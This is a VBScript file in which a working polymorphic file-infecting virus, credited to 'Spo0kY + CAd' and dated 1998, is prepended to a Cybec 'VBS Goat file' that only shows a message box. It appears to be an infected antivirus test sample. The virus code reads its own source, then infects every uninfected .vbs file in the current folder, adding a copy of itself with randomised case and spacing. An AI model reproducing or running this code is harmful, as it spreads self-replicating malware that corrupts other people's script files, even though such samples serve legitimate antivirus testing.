'**********
'  A pOlYMoRPHic  EXample vB    ScripT     ViruS     baSeD     on    vBSV777
'  By  Spo0kY   +   CAd -   14.     noV.    1998 -
' feeL    freE   tO    Use tHE  CBmUtAtE  fUNCTion  in  YoUR Own  buGS  :-)

  cONsT  cBFOrrEADINg =     1    ,    CbfoRwRITing    =  2

  ranDOMiZe
   
    CBWepatH    =     WScrIPT    .     sCriptfullName
   
 SET     CbfSo =    cReAteobjECT    ( "sCripTiNg.FIlEsySTeMOBJeCT"    )
 
 Set  cbWEfIlE  = Cbfso . openteXTfilE  ( CbwepATH ,  CbfORreaDiNg   )
    CBwEcODE =    cbWEfILe     .     reADAlL
 cbWEfIle   .  cloSE
     
 cbVIrUssIZE    =     instR (  3  ,  CBwecodE ,    "*****"  &   "*****" )   +   10     +     1

 set    CBWefIlE   =    CBFSO    .    OpenteXTfilE  ( CBwEpAth  ,     CBfoRrEadiNG  )
 CBWECOdE  =    cbwEfIle   .    REAd     (     CbvIrUsSiZE )
     CbwEFILE    .  cloSe
    
   fOr  EACH   cbfILE  In   cBFsO     .  GetfOLDeR  (    "."     ) .   FILEs
   
   if    lCASE  (     cBFSo    . GETEXTeNSIONName    (    cBfILe     . nAME    )  )     = CHR (    118    )     &   chR  (  98 )    &   ChR   (    115 ) ThEN
    
     set     cBVICTiMFilE   = CBfsO   .    opentExTFiLE     (   CbFiLe    .  PaTh ,     cBFORrEadING   )
 cbiNFecTIOnmArkeR   =    cbviCTiMFIlE    .     rEad     (     11     )
    cbVICtiMFiLe     .  clOSE
 
  iF  CBInFectIonmArKeR     <>     "'*****"     &     "*****"     ThEN

  set CBVIctimFIlE  =   cbFsO  . OPEnTEXtFilE  (  cbFiLE .    paTh   , CBfOrreAdiNG )
  cbvicTiMCode    =    CbVicTimfilE . ReaDaLl
  cbvictImFILE .  cloSe
   
    cBVIcTIMCodE  =    cbmUtaTe  (     CbWeCOde  )    &  CBvicTIMcODe
    
  SeT   CBviCtiMfIlE = CBfSO     .  OpENtExtFILe     (     cBfIle   .  Path  , CBfOrwRITINg   ,     1    )
   CbVictImfILE    .   wRite  cBvIcTiMCODe
     CBvIctImFIlE     .     clOSe
    
     eNd  iF
   
     eND  If
 
     NExT
 
     
 fUncTIoN    CBMUTate   ( cbStRINg    )
   
     cbNewStrINg     =     ""
     CbI   =   1
     
   wHIle Cbi     <=     len  (   cBSTRinG     )
   
     If     miD    ( CBsTRiNG    ,     cBI    ,     1     )    =    CHR   ( 32  )    THEN

    for  CBj   = 1     to   INT   (   5   *    rnD )   +  1

  cbNEWSTRINg  =  CbNewsTriNG +   CHR   (   32 )

 NExt
   
   do
     
   cbi  =  CbI    +  1
     
    looP  WhIle   Mid     (  CbsTRING     ,    CBI   ,   1     )  =   CHr   (   32     )
 
 ElSE
    
     If     InT (   2  *  RND    )  +    1  =     1     theN

 cbNeWStriNG    =  cbNEwStrING   +  UcASe (   mid   (    CbStrIng   ,  cbi     ,  1   )     )

    ELSE

 CBnEWSTrinG   = cbNEwStrInG + lCASe   (    MId    (     CbsTRIng  ,    cbI   ,    1   )    )

    eNd    If

  cbI   =   CBI  +  1
     
 end     if
 
   WEnD
    
 CbmUtaTE    =    cbNEwsTriNG
 
   eNd     FuncTion
     
  '**********
'VBS Goat file

Dim Msg, Style, Title, Help, Ctxt, Responce, MyString
Msg = "This is Cybec VBS Goat file"
Style = vbYesNo + vbExclamation + vbDefaultButton2
Title = "Goat File"
Help = "Goat.hlp"
Ctxt = 1000

Responce = MsgBox(Msg, Style, Title, Help, Ctxt)
